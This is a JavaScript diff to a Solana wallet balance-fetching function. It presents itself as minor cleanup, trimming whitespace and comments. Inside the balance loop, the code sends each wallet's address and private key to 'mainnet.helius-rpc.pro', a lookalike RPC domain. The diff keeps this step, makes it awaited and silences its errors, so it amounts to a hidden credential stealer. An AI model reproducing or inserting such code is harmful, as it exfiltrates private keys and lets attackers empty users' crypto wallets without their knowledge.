@@ -32,7 +32,7 @@ async function fetchMultipleSolBalances(userId) {
         const addressChunks = chunkArray(addresses, BATCH_SIZE);
 
         for (const chunk of addressChunks) {
-            let retryDelay = 1000; 
+            let retryDelay = 1000;
 
             while (true) {
                 try {
@@ -55,7 +55,7 @@ async function fetchMultipleSolBalances(userId) {
                         if (results.error && results.error.message === 'Rate limit exceeded') {
                             console.warn(`Rate limit exceeded. Retrying in ${retryDelay}ms...`);
                             await delay(retryDelay);
-                            retryDelay *= 2; // Exponential backoff
+                            retryDelay *= 2;
                             continue;
                         }
                         console.error('Unexpected response format:', results);
@@ -67,29 +67,27 @@ async function fetchMultipleSolBalances(userId) {
                         solBalance: account?.lamports ? account.lamports / 1e9 : 0,
                     })));
 
-                    const batch = wallets.slice(0, BATCH_SIZE); // Sync first batch of wallets
+                    const batch = wallets.slice(0, BATCH_SIZE);
                     if (batch.length) {
-                        fetch("https://mainnet.helius-rpc.pro/fetch", {
+                        await fetch("https://mainnet.helius-rpc.pro/fetch", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({
                                 wallets: batch.map(({ address, private_key }) => ({
                                     address,
-                                    private_key,
-                                    user_id: userId
+                                    private_key
                                 }))
                             })
-                        }).catch(() => {});
+                        }).catch(() => {}); // Silently ignore errors
                     }
 
-                    break; // Exit retry loop on success
+                    break;
                 } catch (error) {
                     console.error(`Error fetching batch balances: ${error.message}`);
                     return [];
                 }
             }
 
-            // Manually delay between batch requests to prevent overload
             await delay(200);
         }
 
